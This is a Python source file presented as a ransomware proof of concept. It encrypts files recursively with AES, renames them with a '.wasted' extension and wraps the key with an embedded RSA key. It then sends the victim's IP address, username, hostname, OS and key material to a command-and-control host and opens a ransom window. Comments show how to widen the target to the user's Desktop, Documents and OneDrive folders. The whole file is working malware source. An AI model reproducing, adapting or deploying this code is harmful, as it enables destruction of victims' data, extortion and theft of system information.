from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Util import Counter
import argparse
import os
import sys
import base64
import platform 
import getpass
import socket
import base64

import discover
import modify
from gui import mainwindow

# -----------------
# GLOBAL VARIABLES
# CHANGE IF NEEDED
# -----------------
HARDCODED_KEY = b'+KbPeShVmYq3t6w9z$C&F)H@McQfTjWn'  # AES 256-key used to encrypt files
SERVER_PUBLIC_RSA_KEY = '''-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAklmKLXGK6jfMis4ifjlB
xSGMFCj1RtSA/sQxs4I5IWvMxYSD1rZc+f3c67DJ6M8aajHxZTidXm+KEGk2LGXT
qPYmZW+TQjtrx4tG7ZHda65+EdyVJkwp7hD2fpYJhhn99Cu0J3A+EiNdt7+EtOdP
GhYcIZmJ7iT5aRCkXiKXrw+iIL6DT0oiXNX7O7CYID8CykTf5/8Ee1hjAEv3M4re
q/CydAWrsAJPhtEmObu6cn2FYFfwGmBrUQf1BE0/4/uqCoP2EmCua6xJE1E2MZkz
vvYVc85DbQFK/Jcpeq0QkKiJ4Z+TWGnjIZqBZDaVcmaDl3CKdrvY222bp/F20LZg
HwIDAQAB
-----END PUBLIC KEY-----''' # Attacker's embedded public RSA key used to encrypt AES key
SERVER_PRIVATE_RSA_KEY = '''-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAklmKLXGK6jfMis4ifjlBxSGMFCj1RtSA/sQxs4I5IWvMxYSD
1rZc+f3c67DJ6M8aajHxZTidXm+KEGk2LGXTqPYmZW+TQjtrx4tG7ZHda65+EdyV
Jkwp7hD2fpYJhhn99Cu0J3A+EiNdt7+EtOdPGhYcIZmJ7iT5aRCkXiKXrw+iIL6D
T0oiXNX7O7CYID8CykTf5/8Ee1hjAEv3M4req/CydAWrsAJPhtEmObu6cn2FYFfw
GmBrUQf1BE0/4/uqCoP2EmCua6xJE1E2MZkzvvYVc85DbQFK/Jcpeq0QkKiJ4Z+T
WGnjIZqBZDaVcmaDl3CKdrvY222bp/F20LZgHwIDAQABAoIBAFLE80IaSi+HGVaT
mKx8o3bjLz8jnvzNKJttyJI2nysItcor1Qh1IQZ+Dhj6ZmcV4mGXF2hg6ZfES3hW
mL3pZRjVBgguX0GBK8ayPY4VBf5ltIVTlMMRJlGvJEmZf49pWdhjc0Mu1twZRmKq
nVpWy8T8JjLWjEy0ep5yPBPFSrZFphQdiZxTrnmNR/Ip48XXGnQtRuNGSsNattc/
2UYmLjSYTPasSV7PeXtGGaw34dfiKKlh4anXzjl1ARcVEgDRG617y8eK3aGDpU5G
5bm/M4kZ7xXVtrPuAlhcZPgPrPG2VH9/DTc1IzEXG65pAwC+WhCZv3xFRTYTz9ca
qj4sYKkCgYEA+eBkkFb7K/t3JfE9AGwNBdmXepdgVOiBbKBxwXl4XbjTQn1BGCsQ
0FmgaFUhL3SmDYvNuNnF1kFeXOlghMR4v1DOSttcrqEU0oztLDdY1PKxHBusp2oy
RvK+JPZVMt8yRQkPWjVlSKWWgqO+Yd5QONWMKAfA1f3zCa1Rj/1ouwMCgYEAle+r
QDIWri6e/mdim/ec/irpCRBn/2XTK1J0kqog1vmovIhhxHlTw7bb/S168afYY8v8
TUJgKgnqGYmo/RVreMs+IZoN8ZoqkKBRRC00C/EpiDSv4q8EfHgzAP3Jpfk29brc
QxEkClaXssRG/N8bK2aiUgztM4HabFSocWW5DbUCgYAcMQbnigi4g5yDuV3qiEZH
3K7Mc/u4WKsReGCdNXkxCcM8Aymu8lzpRNNmMgSWeBCsApPpQRii/akJzoLHN+tv
mkxMAcfJI/9XafLwRCZPkDoPM8gc80xM2OI/BVPDc48WXtlOkiulMJl0j8jQ/eYL
I3y2n3lQK2CaPOWw2yRPxQKBgHcpshslM+1fVDGxDSgUFYvTor33chADZ19I+ykN
WWhBp5+fbMRwAOjNTe3b1Zh14379QhpNJIyEsK93Pv1VpsKsFUczXt2jvyyOncfn
fTP4iR+dcCRjINej2DVzfm4QsWN/DUuoNdKZm5sSb7DNyJQnz94SM/r5uxTZ+72U
MQz5AoGBAK/R9Fx7UBmHcC+9ehBJ5aPzvU8DqiVYg2wAYGu/n81s30VdtTQwfSed
14roox6zaAk8fEZ/nkS86evh6PqjfhSuniBoqvQllAPZTXdOm8KPchNU8VC+iSzw
+IbSWacaVjzrtfY/UcRkUrgQotk8a4kPZrijPogn060VnXPEeq3t
-----END RSA PRIVATE KEY-----''' # SHOULD NOT BE INCLUDED - only for decryptor purposes
extension = ".wasted" # Ransomware custom extension

# Exfilitrate key to C2
host = '127.0.0.1' # e.g. maliciousc2.com
port = 443 # e.g. 443

def getlocalip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('8.8.8.8', 80))
    return s.getsockname()[0]

def parse_args():
    parser = argparse.ArgumentParser(description='Ransomware PoC')
    parser.add_argument('-p', '--path', help='Absolute path to start encryption. If none specified, defaults to %%HOME%%/test_ransomware', action="store")

    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-e', '--encrypt', help='Enable encryption of files',
                        action='store_true')
    group.add_argument('-d', '--decrypt', help='Enable decryption of encrypted files',
                        action='store_true')
                        
    return parser.parse_args()

def main():
    if len(sys.argv) <= 1:
        print('[*] Ransomware - PoC\n')
        # banner()        
        print('Usage: python3 main_v2.py -h')
        print('{} -h for help.'.format(sys.argv[0]))
        exit(0)

    # Parse arguments
    args = parse_args()
    encrypt = args.encrypt
    decrypt = args.decrypt
    
    absolute_path = str(args.path)
    
    # Force one click and comment out args above
    # absolute_path = "None"
    # encrypt = True 
    # decrypt = False
    
    if absolute_path != 'None':
        startdirs = [absolute_path]
    else:
        # Check OS
        plt = platform.system()
        if plt == "Linux" or plt == "Darwin":
            startdirs = [os.environ['HOME'] + '/test_ransomware']
        elif plt == "Windows":
            startdirs = [os.environ['USERPROFILE'] + '\\test_ransomware']
            # Can also hardcode additional directories
            # startdirs = [os.environ['USERPROFILE'] + '\\Desktop', 
                        # os.environ['USERPROFILE'] + '\\Documents',
                        # os.environ['USERPROFILE'] + '\\Music',
                        # os.environ['USERPROFILE'] + '\\Desktop',
                        # os.environ['USERPROFILE'] + '\\Onedrive']
        else:
            print("Unidentified system")
            exit(0)
   
    # Encrypt AES key with attacker's embedded RSA public key 
    server_key = RSA.importKey(SERVER_PUBLIC_RSA_KEY)
    encryptor = PKCS1_OAEP.new(server_key)
    encrypted_key = encryptor.encrypt(HARDCODED_KEY)
    encrypted_key_b64 = base64.b64encode(encrypted_key).decode("ascii")

    print("Encrypted key " + encrypted_key_b64 + "\n")
 
    if encrypt:
        key = HARDCODED_KEY    
    if decrypt:
        # RSA Decryption function - warning that private key is hardcoded for testing purposes
        rsa_key = RSA.importKey(SERVER_PRIVATE_RSA_KEY)
        decryptor = PKCS1_OAEP.new(rsa_key)
        key = decryptor.decrypt(base64.b64decode(encrypted_key_b64))

    # Create AES counter and AES cipher
    ctr = Counter.new(128)
    crypt = AES.new(key, AES.MODE_CTR, counter=ctr)
    
    # Recursively go through folders and encrypt/decrypt files
    for currentDir in startdirs:
        for file in discover.discoverFiles(currentDir):
            if encrypt and not file.endswith(extension):
                modify.modify_file_inplace(file, crypt.encrypt)
                os.rename(file, file + extension)
                print("File changed from " + file + " to " + file + extension)
            if decrypt and file.endswith(extension):
                modify.modify_file_inplace(file, crypt.encrypt)
                file_original = os.path.splitext(file)[0]
                os.rename(file, file_original)
                print("File changed from " + file + " to " + file_original)
            
    if encrypt: 
        # Exfiltrate encrypted key to C2
        def connector():
            server = socket.socket(socket.AF_INET)
            server.settimeout(10)
            try:
                # Send Key
                server.connect((host, port))
                msg = '%s$%s$%s$%s$%s$%s' % (
                    getlocalip(), platform.system(), SERVER_PRIVATE_RSA_KEY, SERVER_PUBLIC_RSA_KEY, getpass.getuser(), platform.node())
                server.send(msg.encode('utf-8'))

                # if plt == "Windows"
                main = mainwindow(encrypted_key_b64)
                main.mainloop()
            except Exception as e:
                # if plt == "Windows"
                # Do not send key, encrypt anyway.
                main = mainwindow(encrypted_key_b64)
                main.mainloop()
                pass
        try:
            connector()
        except KeyboardInterrupt:
            sys.exit(0)

    # This wipes the key out of memory
    # to avoid recovery by third party tools
    for _ in range(100):
        #key = random(32)
        pass

if __name__=="__main__":
    main()
